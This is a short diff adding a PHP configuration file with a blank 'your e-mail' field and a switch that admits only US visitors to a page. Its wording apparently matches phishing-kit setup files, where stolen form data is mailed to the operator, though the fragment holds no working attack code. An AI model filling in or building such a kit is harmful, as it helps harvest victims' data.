@@ -1,0 +1,4 @@
+<?php
+$yourmail  = '';  // PUT YOUR E-MAIL HERE
+$sa = "no"; // For Allow Just US IP To Open The Page ... IF You Don't Want To Disallow The World Change IT To No
+?>
